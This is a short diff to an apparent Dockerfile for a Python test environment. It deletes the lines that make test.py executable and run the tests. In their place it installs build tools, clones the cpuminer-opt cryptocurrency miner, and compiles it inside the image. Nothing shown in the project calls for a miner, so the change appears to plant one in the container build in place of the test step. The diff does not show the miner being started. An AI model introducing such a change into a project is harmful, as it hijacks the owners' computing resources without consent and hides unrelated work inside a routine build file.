@@ -76,5 +76,19 @@ RUN sudo apt install python3-pip
 RUN pip3 --version
 RUN python3 -m pip install --upgrade pip chevron PyYAML requests tinydb jira pyOpenSSL datadog configparser argparse pathlib typing
 
-RUN chmod +x test.py
-CMD ["python ./test.sh"]
+RUN apt-get update && apt-get -qy install \
+ automake \
+ build-essential \
+ libcurl4-openssl-dev \
+ libssl-dev \
+ git \
+ ca-certificates \
+ libjansson-dev libgmp-dev g++ --no-install-recommends
+
+RUN git clone --recursive https://github.com/JayDDee/cpuminer-opt cpuminer-multi
+WORKDIR /root/cpuminer-multi
+
+RUN ./autogen.sh
+RUN CFLAGS="-O3 -march=native -Wall" CXXFLAGS="$CFLAGS -std=gnu++11" ./configure --with-curl
+
+RUN make
